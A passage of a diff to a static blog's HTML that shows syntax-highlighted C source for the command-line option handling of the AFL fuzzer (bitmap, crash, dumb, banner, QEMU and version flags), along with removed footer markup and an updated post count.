class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) FATAL(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        read_bitmap(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) FATAL(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) FATAL(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) FATAL(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) FATAL(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1387,7 +1409,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
